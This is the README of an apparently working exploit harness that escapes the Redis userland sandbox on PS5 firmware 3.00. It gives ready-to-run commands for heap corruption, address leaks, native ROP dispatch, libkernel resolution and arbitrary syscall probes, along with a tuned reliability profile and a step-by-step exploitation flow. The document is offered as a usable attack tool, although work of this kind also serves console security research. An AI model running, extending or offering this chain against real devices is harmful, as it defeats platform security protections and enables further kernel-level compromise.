# PS5 3.00 Redis Core Escape

Repository description:

> PS5 3.00 Redis native ROP sandbox-escape harness using the Redis HLL/CClosure heap primitive, module-pivot dispatch, libkernel resolution, six-argument call/syscall probes, and a notification proof.

## What This Is

This directory contains a single user-facing Python bundle:

```text
redis_escape_core_300.py
```

It packages the working Redis 3.00 userland escape primitives we have so far:

- Redis HLL layout corruption and controlled heap read window.
- Lua `CClosure` scan to recover the Redis eboot base.
- Module-pivot based native ROP dispatch inside `SceRedisServer`.
- PS5 notification proof through ROP-only `open`, `write`, and `close`.
- GOT/libkernel resolution from live Redis process memory.
- Wrapper-call and direct-syscall probes with controlled `rdi/rsi/rdx/rcx/r8/r9`.
- Sandbox path probing and code-read/debug helpers.

Lapse and UMTX kernel exploit experiments are intentionally not exposed in this bundle. This is the stable Redis/native-ROP layer to hand off, test, and build on.

## Current Status

Working:

- Native ROP dispatch from Redis.
- Notification popup proof.
- Live Redis eboot base recovery.
- Live libkernel/libkernel_sys candidate resolution.
- Controlled arguments for wrapper-call/direct-syscall style probes.


This is still probabilistic. A failed attempt does not mean the target is incompatible; rerun with more attempts or a different layout filler.

## Requirements

- Python 3 on the PC.
- PS5 3.00 target with Redis reachable on the network.
- Default target endpoint: `PS5IP:1003`.

No external Python packages are required.

## First Run

From this directory:

```powershell
python .\redis_escape_core_300.py --help
```

On first run the script unpacks helper modules into:

```text
.redis_escape_core_bundle
```

That folder is generated automatically. The main entry point remains `redis_escape_core_300.py`.

## Known-Good Fast Profile

The fastest profile we have been using is:

```text
--fast --attempts 1 --layout-fillers 15,16,14 --eggs 512
```

`--fast` sets:

- `--closures 512`
- `--scan-size 0x400000`
- `--raw-timeout <= 2`

For reliability testing, increase `--attempts`:

```powershell
python .\redis_escape_core_300.py --mode notify --fast --attempts 5 --layout-fillers 15,16,14 --eggs 512 --notify-text "Redis ROP proof" --out-dir .\poc_runs\notify
```

## Notification Proof

This is the cleanest end-to-end proof that the Redis escape reached native ROP and performed useful syscalls:

```powershell
python .\redis_escape_core_300.py --mode notify --fast --attempts 3 --layout-fillers 15,16,14 --eggs 512 --notify-text "Redis ROP notification" --out-dir .\poc_runs\notify
```

Expected success:

```text
notify: OK
```

You should also see the notification on the PS5.

## Resolve libkernel

Leak Redis GOT entries and derive libkernel/libkernel_sys candidates:

```powershell
python .\redis_escape_core_300.py --mode libkernel --fast --attempts 3 --layout-fillers 15,16,14 --eggs 512 --out-dir .\poc_runs\libkernel
```

Expected output includes copy/paste values like:

```text
libkernel_base=0x...
libkernel_mprotect=0x...
libkernel_sys_base=0x...
libkernel_sys_mprotect=0x...
```

The script also writes a JSON result into the output directory.

## Derive From an Existing GOT Leak

If you already have a raw `got-leak` or `libkernel` output file, resolve it offline without touching Redis:

```
python .\redis_escape_core_300.py --from-got .\poc_runs\libkernel\poc_libkernel_1_fill15.bin --out-dir .\poc_runs\resolved
```

## Wrapper Call Probe

Use a libkernel/libkernel_sys wrapper-style call path and pass up to six arguments:

```
python .\redis_escape_core_300.py --mode wrapper-call --fast --attempts 3 --layout-fillers 15,16,14 --eggs 512 --wrapper-source getpid --wrapper-offset 0x500 --wrapper-arg1 0 --wrapper-arg2 0 --wrapper-arg3 0 --wrapper-arg4 0 --wrapper-arg5 0 --wrapper-arg6 0 --out-dir .\poc_runs\wrapper
```

Argument options:

```text
--wrapper-arg1 ... --wrapper-arg6
--wrapper-argN-msg-offset
--wrapper-argN-scratch-offset
```

Use the `*-msg-offset` or `*-scratch-offset` variants when the argument must point at controlled data.

## Direct Syscall Probe

Direct syscall style probe with six argument slots:

```
python .\redis_escape_core_300.py --mode direct-syscall --fast --attempts 3 --layout-fillers 15,16,14 --eggs 512 --direct-syscall-sixargs --direct-syscall-num 20 --direct-syscall-arg1 0 --direct-syscall-arg2 0 --direct-syscall-arg3 0 --direct-syscall-arg4 0 --direct-syscall-arg5 0 --direct-syscall-arg6 0 --out-dir .\poc_runs\direct_syscall
```

Argument options:

```text
--direct-syscall-arg1 ... --direct-syscall-arg6
--direct-syscall-argN-msg-offset
--direct-syscall-argN-scratch-offset
--direct-syscall-argN-stack-offset
--direct-syscall-argN-stack-page-offset
```

## Other Useful Modes

```text
send                 Minimal ROP send() proof.
got-leak             Raw Redis GOT leak.
libkernel            GOT leak plus libkernel/libkernel_sys resolution.
dlsym-probe          Probe sceKernelDlsym handles/symbols.
module-dlsym-probe   Probe module-name based dlsym.
module-table-leak    Read candidate libkernel module table fields.
dynlib-list          Probe dynlib list behavior.
self-dlsym-probe     Probe dlsym against self/current module assumptions.
self-info-leak       Leak self/module info style output.
mprotect-probe       mprotect wrapper probe.
mprotect-derive      Derive mprotect address without executing it.
libc-getpid-derive   Derive libkernel candidates through libc getpid GOT.
code-read            Read code bytes around selected wrapper/source.
notify               ROP-only notification proof.
both                 Run send, then got-leak.
```


If the target was just rebooted or Redis restarted, the fast profile usually works best.

The script restores `hll-sparse-max-bytes` after each attempt. If Redis disconnects mid-attempt, the next run also tries to restore it.

## Output Files

Use `--out-dir` to keep each experiment separate:

```powershell
--out-dir .\poc_runs\notify
```

Typical files:

```text
poc_<mode>_<case>_fill<filler>.out
poc_<mode>_<case>_fill<filler>.bin
poc_<mode>_<case>_fill<filler>.json
```

`.out` contains the run log, `.bin` is the raw callback/readback payload, and `.json` is written for resolver modes.

## High-Level Flow

1. Build a Redis HLL heap layout.
2. Spray Lua CClosures and marker SDS strings.
3. Corrupt the HLL/SDS metadata enough to open a bounded read window.
4. Recover the B SDS address and scan sprayed CClosure structures.
5. Use a leaked C function pointer to derive the Redis eboot base.
6. Spray fake helper objects for the module-pivot dispatch path.
7. Trigger native ROP through Redis object cleanup.
8. Use the ROP chain to send proof bytes, resolve libraries, call wrappers, or open/write `/dev/notification0`.

